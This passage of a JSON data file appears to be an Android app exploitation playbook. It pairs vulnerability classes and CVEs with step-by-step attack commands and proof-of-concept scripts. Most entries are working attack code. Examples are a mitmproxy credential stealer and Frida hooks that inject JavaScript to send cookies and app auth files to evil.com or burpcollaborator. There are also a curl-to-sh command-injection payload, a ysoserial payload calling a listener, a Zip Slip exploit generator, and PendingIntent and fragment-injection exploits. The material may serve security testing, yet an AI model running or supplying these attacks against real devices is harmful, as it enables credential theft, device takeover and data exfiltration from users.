     "steps":"[CVE-2021-0341 OkHttp Hostname Bypass] Complete MITM exploitation when certificate validation is disabled:\n\n1. CVE-2021-0341: OkHttp hostname verification bypass:\n   # OkHttp < 4.9.1 fails to verify hostnames against SAN entries\n   # Generate cert with SAN matching target domain:\n   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \\\n     -days 365 -nodes -subj '/CN=*' -addext 'subjectAltName=DNS:*.target.com'\n   # mitmproxy accepts this even without proper chain\n\n2. Setup MITM proxy:\n   mitmproxy --mode regular -p 8080\n   # Or Burp Suite: Proxy > Options > Add listener 8080\n\n3. Install proxy CA on device:\n   adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/\n   # Android 7+: Settings > Security > Install from storage\n   # Android 14+: Settings > Security > More > Encryption > Install cert\n\n4. Configure device proxy:\n   adb shell settings put global http_proxy <attacker_ip>:8080\n   # ALL HTTPS traffic now visible — app trusts any certificate\n\n5. Intercept and steal credentials:\n   # mitmproxy: filter '~q & ~s authorization'\n   # Burp: Proxy > HTTP History > filter 'password|token'\n   # Extract: OAuth tokens, session cookies, API keys, JWT tokens\n\n6. Modify server responses to bypass security:\n   mitmdump -s response_modifier.py\n   # Bypass OTP: change {\"verified\":false} to {\"verified\":true}\n   # Bypass subscription: change {\"premium\":false} to {\"premium\":true}\n   # Inject XSS: modify HTML responses to include JS payload\n\n7. Persistent credential theft:\n   # Automate with mitmproxy script to log all auth headers\n   # Forward tokens to attacker C2 in real-time",
     "poc":"#!/usr/bin/env python3\n# mitmproxy inline script: steal credentials in transit\nfrom mitmproxy import http\nimport json, re\n\nclass CredentialStealer:\n    def request(self, flow: http.HTTPFlow):\n        # Check request body for credentials\n        if flow.request.content:\n            body = flow.request.content.decode('utf-8', errors='ignore')\n            for pattern in ['password', 'token', 'secret', 'credential', 'auth']:\n                if pattern in body.lower():\n                    print(f'[!] CREDS in POST to {flow.request.pretty_url}')\n                    print(f'    Body: {body[:300]}')\n        # Check auth headers\n        for h in ['authorization', 'x-api-key', 'x-auth-token']:\n            if h in flow.request.headers:\n                print(f'[!] AUTH HEADER: {h}: {flow.request.headers[h]}')\n\naddons = [CredentialStealer()]"},
    {"vuln":"SSL Error Override","tool":"Frida, mitmproxy",
     "steps":"1. App calls handler.proceed() on SSL errors — full MITM:\n   mitmproxy -p 8080 --ssl-insecure\n2. Configure device proxy\n3. All HTTPS traffic decrypted even with invalid certs\n4. Frida hook to confirm:\n   Java.use('android.webkit.SslErrorHandler').proceed.implementation = function() {\n     console.log('[*] SSL error ignored by app — MITM possible');\n     this.proceed();\n   };",
     "poc":"// Frida: confirm and exploit SSL error override\nJava.perform(function() {\n    var SslErrorHandler = Java.use('android.webkit.SslErrorHandler');\n    SslErrorHandler.proceed.implementation = function() {\n        console.log('[CRITICAL] App ignores SSL errors — full MITM active');\n        console.log('[*] Stack: ' + Java.use('android.util.Log').getStackTraceString(\n            Java.use('java.lang.Exception').$new()));\n        this.proceed();\n    };\n    var WebViewClient = Java.use('android.webkit.WebViewClient');\n    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {\n        console.log('[CRITICAL] onReceivedSslError called, error: ' + error.toString());\n        handler.proceed(); // App auto-accepts\n    };\n});"},
    {"vuln":"Insecure WebView","tool":"adb, Frida, Chrome DevTools Protocol","cves":["CVE-2025-0097","CVE-2025-27363","CVE-2012-6636"],
     "steps":"[CVE-2025-0097 Samsung Galaxy Store RCE + CVE-2025-27363 FreeType OOB] WebView exploitation chains:\n\n1. Enable WebView debugging (if not already):\n   chrome://inspect/#devices\n   # Or force-enable via Frida:\n   Java.use('android.webkit.WebView').setWebContentsDebuggingEnabled(true);\n\n2. CVE-2025-0097 Pattern: Deeplink-to-WebView RCE:\n   # Samsung Galaxy Store allowed javascript: in deeplink URLs\n   adb shell am start -n <pkg>/.WebViewActivity --es url \"javascript:fetch('https://evil.com/steal?c='+document.cookie)\"\n   # If JS interface exposed, chain to code execution:\n   adb shell am start -d '<pkg>://webview?url=javascript:window.AppBridge.executeCommand(\"cat /data/data/<pkg>/shared_prefs/auth.xml\")'\n\n3. addJavascriptInterface RCE (targetSdkVersion < 17):\n   # CVE-2012-6636 pattern - still found in embedded SDKs\n   jsinterface.getClass().forName('java.lang.Runtime')\n     .getMethod('exec',''.getClass()).invoke(null,'id')\n\n4. CVE-2025-27363 FreeType Font Exploitation:\n   # Craft malicious TTF font triggering heap overflow in WebView\n   # Embed via CSS: @font-face { font-family:'X'; src:url('payload.ttf'); }\n   # When WebView renders page, FreeType overflow triggers\n\n5. File Theft via file:// and content:// Schemes:\n   javascript:fetch('file:///data/data/<pkg>/shared_prefs/auth.xml')\n     .then(r=>r.text())\n     .then(t=>fetch('https://YOUR_ID.burpcollaborator.net/?d='+btoa(t)))\n\n6. Universal XSS via setAllowUniversalAccessFromFileURLs:\n   # If enabled, file:// pages can read any origin\n   # Load local HTML that fetches all app databases",
     "poc":"// Frida: exploit WebView JS interface for RCE (CVE-2012-6636 pattern)\nJava.perform(function() {\n    var WebView = Java.use('android.webkit.WebView');\n    WebView.addJavascriptInterface.implementation = function(obj, name) {\n        console.log('[!] JS Interface added: ' + name + ' -> ' + obj.getClass().getName());\n        this.addJavascriptInterface(obj, name);\n    };\n    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {\n        console.log('[*] loadUrl: ' + url);\n        // Inject payload after page loads\n        var payload = \"javascript:void(document.location='https://'+'" + "YOUR_ID.burpcollaborator.net" + "'+'/steal?cookies='+document.cookie)\";\n        this.loadUrl(url);\n        var self = this;\n        setTimeout(function(){ self.loadUrl(payload); }, 2000);\n    };\n});"},
    {"vuln":"SQL Injection","tool":"adb, drozer, Frida, sqlmap",
     "steps":"1. Find content providers:\n   drozer: run scanner.provider.finduris -a <package>\n   adb: dumpsys package <package> | grep 'provider'\n2. Test injection:\n   adb shell content query --uri content://<pkg>.provider/users --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\"\n3. Exfiltrate data:\n   adb shell content query --uri content://<pkg>.provider/users --where \"1=1) UNION SELECT username,password,email FROM users--\"\n4. drozer automated scan:\n   dz> run scanner.provider.injection -a <package>\n   dz> run app.provider.query content://<pkg>/users --projection \"* FROM sqlite_master--\"\n5. Frida SQLite monitor:\n   Hook rawQuery() to log all SQL queries and find injection points",
     "poc":"// Frida: real-time SQL injection detector + data exfiltrator\nJava.perform(function() {\n    var SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');\n    SQLiteDatabase.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function(sql, args) {\n        console.log('[SQL] ' + sql);\n        if (args !== null) {\n            for (var i = 0; i < args.length; i++) console.log('  [ARG' + i + '] ' + args[i]);\n        }\n        var cursor = this.rawQuery(sql, args);\n        // Dump first 5 rows\n        var cols = cursor.getColumnCount();\n        var count = 0;\n        while (cursor.moveToNext() && count < 5) {\n            var row = '';\n            for (var c = 0; c < cols; c++) row += cursor.getString(c) + ' | ';\n            console.log('  [ROW] ' + row);\n            count++;\n        }\n        cursor.moveToFirst();\n        return cursor;\n    };\n});"},
    {"vuln":"Command Injection","tool":"Frida, adb","cves":["CVE-2024-31317","CVE-2024-0044","CVE-2020-0069"],
     "steps":"[CVE-2024-31317 Zygote Injection + CVE-2024-0044 run-as Bypass] Real-world command injection chains:\n\n1. Find Runtime.exec() calls in decompiled source:\n   jadx -d output/ target.apk\n   grep -rn 'Runtime.getRuntime.*exec\\|ProcessBuilder' output/\n   # Trace user input flow to exec() parameters\n\n2. CVE-2024-0044 run-as Package Name Injection:\n   # Inject newline into package name to forge packages.list entry\n   # Gain run-as access to ANY app on device:\n   adb shell run-as 'com.victim' cat /data/data/com.victim/shared_prefs/auth.xml\n   adb shell run-as 'com.victim' ls -la /data/data/com.victim/databases/\n   adb shell run-as 'com.victim' sqlite3 /data/data/com.victim/databases/app.db '.dump'\n\n3. CVE-2024-31317 Zygote Command Injection:\n   # Inject wrap properties to LD_PRELOAD into any app process:\n   adb shell setprop wrap.<package> 'LD_PRELOAD=/data/local/tmp/exploit.so'\n   adb shell am force-stop <package>\n   # exploit.so executes in <package>'s process context\n   # Read all private files, keystore, shared memory\n\n4. CVE-2020-0069 MediaTek Kernel Escalation:\n   # On MediaTek devices, /proc/mtk_cmdq allows root:\n   echo 1 > /proc/mtk_cmdq\n   # Gain kernel read/write -> disable SELinux -> root shell\n\n5. Test standard injection payloads via app input fields:\n   Input: ; id; whoami; cat /data/data/<pkg>/shared_prefs/*.xml\n   Input: $(curl http://$(hostname -I | awk '{print $1}'):8080/shell.sh | sh)\n   Input: `cat /etc/passwd`\n   Input: %0aid%0awhoami\n\n6. Hook all command execution with Frida:\n   frida -U -f <package> -l cmd_hook.js\n   # Monitor Runtime.exec, ProcessBuilder.start, native execve",
     "poc":"// Frida: hook all command execution + inject test payload\nJava.perform(function() {\n    var Runtime = Java.use('java.lang.Runtime');\n    // Hook exec(String)\n    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n        console.log('[CMD-EXEC] ' + cmd);\n        // Test: append safe canary command\n        var result = this.exec(cmd);\n        return result;\n    };\n    // Hook exec(String[])\n    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdArray) {\n        console.log('[CMD-EXEC-ARRAY] ' + cmdArray.join(' '));\n        return this.exec(cmdArray);\n    };\n    // Hook ProcessBuilder\n    var PB = Java.use('java.lang.ProcessBuilder');\n    PB.start.implementation = function() {\n        var cmd = this.command().toString();\n        console.log('[PROCESS-BUILDER] ' + cmd);\n        return this.start();\n    };\n    console.log('[*] Command execution hooks installed');\n});"},
    {"vuln":"Weak Crypto","tool":"Frida, JADX",
     "steps":"1. Hook Cipher.getInstance to detect DES/RC4/ECB:\n   frida -U -f <package> -l crypto_hook.js\n2. Identify weak algorithms in decompiled code:\n   grep -rn 'DES\\|RC4\\|ECB' output/\n3. Extract encrypted data + key from memory:\n   Use Frida to hook SecretKeySpec constructor, dump key bytes\n4. Decrypt offline:\n   openssl enc -des-ecb -d -K <hex_key> -in encrypted.bin\n5. If ECB mode: look for visual patterns in encrypted images\n   (identical plaintext blocks = identical ciphertext blocks)",
     "poc":"// Frida: intercept all crypto operations, dump keys + plaintext\nJava.perform(function() {\n    var Cipher = Java.use('javax.crypto.Cipher');\n    Cipher.getInstance.overload('java.lang.String').implementation = function(algo) {\n        console.log('[CRYPTO] Algorithm: ' + algo);\n        if (/DES|RC4|ECB/i.test(algo)) console.log('[!!! WEAK] ' + algo);\n        return this.getInstance(algo);\n    };\n    Cipher.doFinal.overload('[B').implementation = function(input) {\n        console.log('[CRYPTO-INPUT] ' + bytesToHex(input));\n        var output = this.doFinal(input);\n        console.log('[CRYPTO-OUTPUT] ' + bytesToHex(output));\n        return output;\n    };\n    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');\n    SKS.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {\n        console.log('[KEY] Algorithm: ' + algo + ' Key: ' + bytesToHex(key));\n        return this.$init(key, algo);\n    };\n    function bytesToHex(bytes) {\n        var hex = [];\n        for (var i = 0; i < bytes.length; i++) hex.push(('0'+((bytes[i]&0xFF).toString(16))).slice(-2));\n        return hex.join('');\n    }\n});"},
    {"vuln":"Hardcoded Crypto Key","tool":"Frida, JADX, CyberChef",
     "steps":"1. Find SecretKeySpec in decompiled code:\n   grep -rn 'SecretKeySpec' output/\n2. Extract the hardcoded key string\n3. Hook SecretKeySpec to dump runtime key:\n   frida -U -f <package> -l key_dump.js\n4. Use CyberChef to decrypt data:\n   AES Decrypt > Key: <extracted_key> > Mode: ECB/CBC\n5. If key is in resources/assets, extract directly:\n   apktool d target.apk && find . -name '*.key' -o -name '*.pem'",
     "poc":"// Frida: dump hardcoded crypto keys at runtime\nJava.perform(function() {\n    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');\n    SKS.$init.overload('[B', 'java.lang.String').implementation = function(keyBytes, algorithm) {\n        var key = '';\n        for (var i = 0; i < keyBytes.length; i++) {\n            key += String.fromCharCode(keyBytes[i] & 0xFF);\n        }\n        console.log('[CRITICAL] Hardcoded Key Captured!');\n        console.log('  Algorithm: ' + algorithm);\n        console.log('  Key (ASCII): ' + key);\n        console.log('  Key (Hex): ' + bytesToHex(keyBytes));\n        console.log('  Key (Base64): ' + Java.use('android.util.Base64').encodeToString(keyBytes, 0));\n        return this.$init(keyBytes, algorithm);\n    };\n    function bytesToHex(b){var h=[];for(var i=0;i<b.length;i++)h.push(('0'+((b[i]&0xFF).toString(16))).slice(-2));return h.join('');}\n});"},
    {"vuln":"Deeplink Hijack","tool":"adb, drozer, custom app","cves":["CVE-2025-0097","CVE-2020-0096"],
     "steps":"[CVE-2025-0097 Samsung Galaxy Store RCE + CVE-2020-0096 StrandHogg 2.0] Deeplink hijacking techniques:\n\n1. Extract registered schemes from AndroidManifest:\n   aapt dump xmltree target.apk AndroidManifest.xml | grep -A5 'scheme'\n   # Identify: custom schemes (myapp://), http/https handlers, app links\n\n2. CVE-2025-0097 Pattern: Deeplink → WebView → RCE:\n   # Samsung Galaxy Store accepted javascript: in deeplink URL parameter\n   adb shell am start -d 'myapp://webview?url=javascript:alert(document.cookie)'\n   adb shell am start -d 'myapp://auth/callback?redirect=https://YOUR_ID.burpcollaborator.net/phishing'\n   # If WebView has JS interface, chain to full RCE\n\n3. CVE-2020-0096 StrandHogg via deeplink trigger:\n   # User clicks deeplink → target app opens → attacker activity overlays\n   adb shell am start -a android.intent.action.VIEW \\\n     -d 'scheme://host/path?param=<script>alert(1)</script>'\n\n4. Build competing app to intercept deeplinks:\n   # Register identical intent-filter with higher priority:\n   <intent-filter android:priority=\"999\">\n     <data android:scheme=\"myapp\" android:host=\"auth\"/>\n   </intent-filter>\n   # Android shows chooser → attacker app steals auth tokens\n\n5. Token theft via redirect parameter injection:\n   adb shell am start -d 'myapp://auth/callback?token=stolen&redirect=https://YOUR_ID.burpcollaborator.net'\n   # Many apps pass OAuth tokens through deeplink params\n\n6. Open redirect → phishing:\n   adb shell am start -d 'myapp://webview?url=https://YOUR_ID.burpcollaborator.net/fake-login.html'",
     "poc":"// Malicious app manifest to hijack deeplinks:\n// <intent-filter>\n//   <action android:name=\"android.intent.action.VIEW\"/>\n//   <category android:name=\"android.intent.category.DEFAULT\"/>\n//   <category android:name=\"android.intent.category.BROWSABLE\"/>\n//   <data android:scheme=\"myapp\" android:host=\"auth\"/>\n// </intent-filter>\n//\n// When user clicks myapp://auth/callback?token=xxx\n// Android shows chooser -> attacker app steals token\n\n// Frida: monitor all incoming intents\nJava.perform(function() {\n    var Activity = Java.use('android.app.Activity');\n    Activity.onNewIntent.implementation = function(intent) {\n        console.log('[DEEPLINK] ' + intent.getData().toString());\n        console.log('[EXTRAS] ' + intent.getExtras());\n        this.onNewIntent(intent);\n    };\n});"},
    {"vuln":"Mutable PendingIntent","tool":"adb, custom exploit app","cves":["CVE-2021-0595","CVE-2022-20007","CVE-2024-43093"],
     "steps":"[CVE-2021-0595 + CVE-2022-20007] PendingIntent hijack enables privilege escalation to system:\n\n1. Identify mutable PendingIntents in code:\n   grep -rn 'PendingIntent.get' output/ | grep -v 'FLAG_IMMUTABLE'\n   grep -rn 'PendingIntent.get' output/ | grep 'flags.*0)'\n\n2. CVE-2021-0595 System PendingIntent Hijack:\n   # System apps broadcast mutable PendingIntents\n   adb shell dumpsys activity intents | grep PendingIntent\n   # Intercept and modify target/extras:\n   # Original: opens Settings > Wi-Fi\n   # Modified: opens Settings > Developer Options > Enable ADB\n\n3. CVE-2022-20007 Background Activity Launch:\n   # Use mutable PendingIntent + AlarmManager to bypass background restrictions\n   # AlarmManager fires PendingIntent -> launches foreground activity\n   # Overlays banking app with phishing UI\n   AlarmManager am = getSystemService(ALARM_SERVICE);\n   am.setExact(RTC_WAKEUP, System.currentTimeMillis()+100, mutablePI);\n\n4. Build exploit app:\n   # Register receiver matching broadcast action\n   # When PendingIntent fires, modify and re-send\n   # Redirect to non-exported SystemUI activities\n   # Result: privilege escalation to system\n\n5. Notification tap hijack:\n   # Intercept notification PendingIntent\n   # Modify click action to open attacker URL\n   # User taps notification expecting real app, gets phishing page",
     "poc":"// Exploit app code: hijack mutable PendingIntent\n// 1. Attacker app registers receiver matching the implicit intent\n// 2. When PendingIntent fires, Android delivers to attacker\n// 3. Attacker modifies and re-sends with elevated privileges\n\n// In attacker's BroadcastReceiver:\npublic void onReceive(Context ctx, Intent intent) {\n    // Original PendingIntent arrived — steal data\n    String token = intent.getStringExtra(\"auth_token\");\n    Log.d(\"EXPLOIT\", \"Stolen token: \" + token);\n    // Modify and forward to escalate privileges\n    intent.setComponent(new ComponentName(\"com.target\", \"com.target.AdminActivity\"));\n    intent.putExtra(\"role\", \"admin\");\n    ctx.startActivity(intent);\n}"},
    {"vuln":"Content Provider Injection","tool":"drozer, adb, Frida","cves":["CVE-2024-23706","CVE-2024-43093"],
     "steps":"[CVE-2024-23706 Health Connect + CVE-2024-43093 DocumentsUI] Content provider SQL injection and access control bypass:\n\n1. CVE-2024-23706 Health Connect Provider Bypass:\n   # Health Connect fails to validate caller permissions\n   # Any app can read/write health records without HEALTH_CONNECT permission:\n   adb shell content query --uri content://com.google.android.healthconnect/records\n   # Read heart rate, steps, blood pressure, medications\n\n2. Find injectable providers with drozer:\n   dz> run scanner.provider.injection -a <package>\n   dz> run scanner.provider.traversal -a <package>\n\n3. SQL injection via content URI:\n   adb shell content query --uri content://<pkg>.provider/users \\\n     --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\"\n   adb shell content query --uri content://<pkg>.provider/users \\\n     --where \"1=1) UNION SELECT username,password,email,4 FROM users--\"\n\n4. Path traversal on FileProvider:\n   adb shell content read --uri content://<pkg>.fileprovider/root/../../../../etc/passwd\n   adb shell content read --uri content://<pkg>.fileprovider/root/../shared_prefs/auth.xml\n\n5. CVE-2024-43093 DocumentsUI Exploitation:\n   # Craft document intent triggering system privilege escalation\n   adb shell am start -a android.intent.action.OPEN_DOCUMENT \\\n     -d content://<pkg>.fileprovider/exploit\n\n6. Insert malicious records:\n   adb shell content insert --uri content://<pkg>.provider/users \\\n     --bind name:s:admin --bind role:s:superuser --bind active:i:1",
     "poc":"#!/bin/bash\n# Content provider injection scanner\nPKG=$1\necho \"[*] Testing content providers for $PKG\"\n# Get all provider authorities\nfor auth in $(adb shell dumpsys package $PKG | grep -oP '(?<=authority=)[\\w.]+'); do\n    URI=\"content://$auth/\"\n    echo \"\\n[+] Testing: $URI\"\n    # Basic query\n    adb shell content query --uri $URI 2>/dev/null | head -3\n    # SQL injection\n    adb shell content query --uri $URI --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\" 2>/dev/null | head -3\n    # Path traversal\n    adb shell content read --uri \"${URI}../../../../etc/hosts\" 2>/dev/null | head -3\ndone"},
    {"vuln":"Zip Path Traversal","tool":"custom Python script","cves":["CVE-2021-0691","CVE-2023-21036"],
     "steps":"[CVE-2021-0691 + Zip Slip] Path traversal via ZIP extraction exploits:\n\n1. Find ZipEntry.getName() usage without sanitization:\n   grep -rn 'ZipEntry.*getName' output/ | grep -v 'canonical\\|normalize\\|contains(\"..\")'\n   grep -rn 'ZipInputStream\\|ZipFile' output/\n\n2. Craft malicious ZIP with directory traversal entries:\n   python3 -c \"\n   import zipfile\n   z = zipfile.ZipFile('evil.zip','w')\n   # Overwrite SharedPreferences to inject admin session:\n   z.writestr('../../data/data/<pkg>/shared_prefs/auth.xml',\n     '<map><string name=\\\"token\\\">ADMIN_TOKEN</string></map>')\n   # Overwrite DEX for code execution (CVE-2021-0691 pattern):\n   z.writestr('../../data/data/<pkg>/app_dex/plugin.dex', open('evil.dex','rb').read())\n   z.close()\n   \"\n\n3. Deliver payload to app:\n   # Via file download, email attachment, shared intent\n   adb shell am start -a android.intent.action.VIEW -d file:///sdcard/evil.zip -n <pkg>/.ImportActivity\n\n4. Impact assessment:\n   # SharedPrefs overwrite -> session hijack, auth bypass\n   # DEX overwrite -> arbitrary code execution next app launch\n   # Database overwrite -> data injection, privilege escalation\n   # Native lib overwrite -> native code execution\n\n5. CVE-2023-21036 aCropalypse pattern:\n   # Check if app truncates files properly after modification\n   # Old data may remain readable after file size reduction",
     "poc":"#!/usr/bin/env python3\n# Zip Slip exploit generator\nimport zipfile, sys, io\n\ntarget_pkg = sys.argv[1] if len(sys.argv) > 1 else 'com.target.app'\noutput = 'zipslip_exploit.zip'\n\nwith zipfile.ZipFile(output, 'w') as zf:\n    # Overwrite SharedPreferences to inject admin session\n    payload_prefs = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<map>\n    <string name=\"session_token\">ATTACKER_ADMIN_TOKEN</string>\n    <string name=\"role\">admin</string>\n    <boolean name=\"authenticated\" value=\"true\"/>\n</map>'''\n    zf.writestr(\n        f'../../../../../data/data/{target_pkg}/shared_prefs/auth_prefs.xml',\n        payload_prefs\n    )\n    # Overwrite native lib for code execution\n    zf.writestr(\n        f'../../../../../data/data/{target_pkg}/lib/libpayload.so',\n        b'\\x7fELF'  # ELF header placeholder\n    )\nprint(f'[+] Zip Slip exploit written to {output}')"},
    {"vuln":"Fragment Injection","tool":"adb, drozer","cves":["CVE-2024-43093","CVE-2013-6271"],
     "steps":"[CVE-2024-43093 Framework EoP + CVE-2013-6271 Classic] Fragment injection to bypass access control:\n\n1. Find PreferenceActivity subclasses:\n   grep -rn 'extends PreferenceActivity' output/\n   # Check if isValidFragment() returns true for all:\n   grep -A3 'isValidFragment' output/\n\n2. Launch with arbitrary internal fragments:\n   adb shell am start -n <pkg>/.SettingsActivity \\\n     --es ':android:show_fragment' '<pkg>.internal.AdminFragment'\n   adb shell am start -n <pkg>/.SettingsActivity \\\n     --es ':android:show_fragment' '<pkg>.debug.DebugFragment'\n\n3. Inject system framework fragments (CVE-2013-6271 pattern):\n   adb shell am start -n <pkg>/.SettingsActivity \\\n     --es ':android:show_fragment' 'com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment'\n   # Bypass lock screen settings, change PIN without knowing current PIN\n\n4. CVE-2024-43093 DocumentsUI fragment escalation:\n   # Craft document intent that loads privileged fragment\n   # DocumentsUI runs with system_server permissions\n   # Injected fragment executes with elevated privileges\n\n5. Chain with exported activity:\n   # If SettingsActivity is exported, anyone can inject fragments\n   # Access admin panels, debug views, data export functions\n   # No authentication required if fragment loads directly\n\n6. Test all activities extending PreferenceActivity:\n   for act in $(grep -l 'PreferenceActivity' output/ -r); do\n     echo \"Testing: $act\"\n     adb shell am start -n <pkg>/$(basename $act .java) \\\n       --es ':android:show_fragment' 'com.android.settings.wifi.WifiSettings'\n   done",
     "poc":"#!/bin/bash\n# Fragment injection exploit\nPKG=$1\nACTIVITY=$2  # e.g., .SettingsActivity\n\n# Try injecting internal fragments\nFRAGMENTS=(\n    \"com.target.internal.AdminFragment\"\n    \"com.target.debug.DebugFragment\"\n    \"com.android.settings.ChooseLockPassword\\$ChooseLockPasswordFragment\"\n    \"com.android.settings.wifi.WifiSettings\"\n)\n\nfor frag in \"${FRAGMENTS[@]}\"; do\n    echo \"[*] Injecting: $frag\"\n    adb shell am start -n $PKG/$ACTIVITY \\\n        --es ':android:show_fragment' \"$frag\" \\\n        --es ':android:show_fragment_title' 'Injected' 2>/dev/null\n    sleep 1\ndone"},
    {"vuln":"Firebase Misconfiguration","tool":"curl, Firebase Scanner",
     "steps":"1. Extract Firebase URL from decompiled code:\n   grep -rn 'firebaseio.com' output/\n2. Test for open read access:\n   curl https://<project>.firebaseio.com/.json\n3. Test for open write access:\n   curl -X PUT -d '{\"exploit\":\"test\"}' https://<project>.firebaseio.com/test.json\n4. Enumerate collections:\n   curl https://<project>.firebaseio.com/users.json\n   curl https://<project>.firebaseio.com/orders.json\n5. Download entire database:\n   curl https://<project>.firebaseio.com/.json?shallow=true\n   Then iterate each key to dump full data",
     "poc":"#!/usr/bin/env python3\n# Firebase misconfiguration scanner\nimport urllib.request, json, sys\n\nfb_url = sys.argv[1]  # e.g., https://myproject.firebaseio.com\nprint(f'[*] Testing Firebase: {fb_url}')\n\n# Test open read\ntry:\n    resp = urllib.request.urlopen(f'{fb_url}/.json?shallow=true')\n    data = json.loads(resp.read())\n    print(f'[CRITICAL] Firebase is OPEN! Collections: {list(data.keys())}')\n    for key in list(data.keys())[:5]:\n        resp2 = urllib.request.urlopen(f'{fb_url}/{key}.json?limitToFirst=3')\n        print(f'  [{key}] {resp2.read().decode()[:200]}')\nexcept Exception as e:\n    if '401' in str(e) or '403' in str(e):\n        print('[+] Firebase properly secured')\n    else:\n        print(f'[?] Error: {e}')"},
    {"vuln":"WebView XSS","tool":"Frida, adb, Chrome DevTools",
     "steps":"1. Find addJavascriptInterface in decompiled code:\n   grep -rn 'addJavascriptInterface' output/\n2. Identify exposed interface name and methods\n3. Inject JS to call exposed methods:\n   adb shell am start -n <pkg>/.WebActivity --es url \"javascript:void(window.<interface>.sensitiveMethod('attacker_data'))\"\n4. Chain with file:// for local file read:\n   javascript:fetch('file:///data/data/<pkg>/databases/app.db').then(r=>r.blob()).then(b=>{/* exfiltrate */})\n5. If targetSdkVersion < 17: full RCE via reflection\n   <interface>.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id')",
     "poc":"// Frida: exploit addJavascriptInterface for data theft\nJava.perform(function() {\n    var WebView = Java.use('android.webkit.WebView');\n    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {\n        console.log('[WebView] Loading: ' + url);\n        this.loadUrl(url);\n        // Inject XSS payload after page loads\n        var self = this;\n        setTimeout(function() {\n            var xss = \"javascript:void(\" +\n                \"fetch('file:///data/data/\" + Java.use('android.app.ActivityThread').currentApplication().getPackageName() + \"/shared_prefs/auth.xml')\" +\n                \".then(r=>r.text())\" +\n                \".then(t=>fetch('https://YOUR_ID.burpcollaborator.net/steal?data='+btoa(t)))\" +\n                \")\";\n            self.loadUrl(xss);\n        }, 3000);\n    };\n});"},
    {"vuln":"Unsafe Deserialization","tool":"Frida, ysoserial","cves":["CVE-2023-20963","CVE-2022-20474"],
     "steps":"[CVE-2023-20963 WorkSource Parcel Mismatch + CVE-2022-20474 LazyValue] Android Bundle/Parcel deserialization attacks:\n\n1. CVE-2023-20963 (Exploited in the wild by Pinduoduo spyware):\n   # WorkSource class has marshaling/unmarshaling size mismatch\n   # When Bundle is re-parceled by system_server, offset shifts\n   # Attacker-controlled data read as intent fields after re-parse\n   # Pinduoduo used this to:\n   #   - Install additional APKs silently\n   #   - Read all notifications\n   #   - Prevent uninstallation\n   #   - Access files without permission\n\n2. CVE-2022-20474 LazyValue Exploit:\n   # Create Bundle with type-mismatched entries\n   # First unparcel: key 'a' read as Parcelable (4 bytes)\n   # Second unparcel: key 'a' read as ByteArray (variable)\n   # Remaining data reinterpreted as additional Bundle entries\n   # Inject startActivity intent targeting non-exported activity\n\n3. Detect vulnerable ObjectInputStream usage:\n   grep -rn 'readObject\\|ObjectInputStream\\|readParcelable' output/\n   grep -rn 'Parcel.*unmarshall\\|Bundle.*getParcelable' output/\n\n4. Classic Java deserialization with ysoserial:\n   java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR_LISTENER_IP:8080/pwned' > payload.ser\n   # Deliver via: Intent extras, saved files, IPC\n\n5. Frida hook to detect deserialization at runtime:\n   frida -U -f <pkg> -l deserialize_hook.js\n\n6. Check for Apache Commons, Spring gadget chains:\n   grep -rn 'commons-collections\\|spring-core' output/\n   # If present: exploit chain available via ysoserial",
     "poc":"// Frida: monitor and exploit deserialization\nJava.perform(function() {\n    var OIS = Java.use('java.io.ObjectInputStream');\n    OIS.readObject.implementation = function() {\n        var obj = this.readObject();\n        console.log('[DESERIALIZE] Class: ' + obj.getClass().getName());\n        console.log('[DESERIALIZE] toString: ' + obj.toString().substring(0, 200));\n        return obj;\n    };\n    console.log('[*] Deserialization hook installed');\n});"},
    {"vuln":"Dynamic Code Loading","tool":"Frida, file monitor","cves":["CVE-2021-0691","CVE-2023-45779","CVE-2024-31317"],
     "steps":"[CVE-2021-0691 Installer Race + CVE-2023-45779 APEX Bypass] Dynamic code loading exploitation:\n\n1. Find DexClassLoader/PathClassLoader in decompiled code:\n   grep -rn 'DexClassLoader\\|PathClassLoader\\|loadDex\\|InMemoryDexClassLoader' output/\n   grep -rn 'dalvik.system' output/\n\n2. CVE-2021-0691 Package Installer Race Condition:\n   # Monitor /data/local/tmp during installation:\n   inotifywait -m /data/local/tmp -e create -e modify\n   # Between verification and install, swap APK:\n   cp /sdcard/malicious.apk /data/local/tmp/target.apk\n   # Replacement APK installs with original UID + permissions\n\n3. CVE-2023-45779 APEX Module Signing Bypass:\n   # Many OEMs ship with publicly known APEX test keys\n   # Extract: unzip system.img && find . -name '*.apex'\n   # Sign malicious module with test key:\n   signapk test-key.x509.pem test-key.pk8 evil.apex\n   adb install --apex evil.apex\n   # Module gets system privileges on next boot\n\n4. Monitor DEX loading locations:\n   adb shell inotifywait -m /data/data/<pkg>/ -e create -e modify | grep .dex\n   # Common paths: app_dex/, files/plugins/, cache/\n\n5. Replace DEX on disk before app loads it:\n   adb shell cp /sdcard/evil.dex /data/data/<pkg>/app_dex/plugin.dex\n   adb shell am force-stop <pkg>\n   # App loads evil.dex next launch\n\n6. If DEX loaded over network: MITM to replace in transit:\n   mitmdump -s dex_replace.py  # intercept and swap .dex/.jar responses\n\n7. CVE-2024-31317 wrap property for library injection:\n   adb shell setprop wrap.<pkg> 'LD_PRELOAD=/data/local/tmp/hook.so'\n   # Native code executes in app context on next launch",
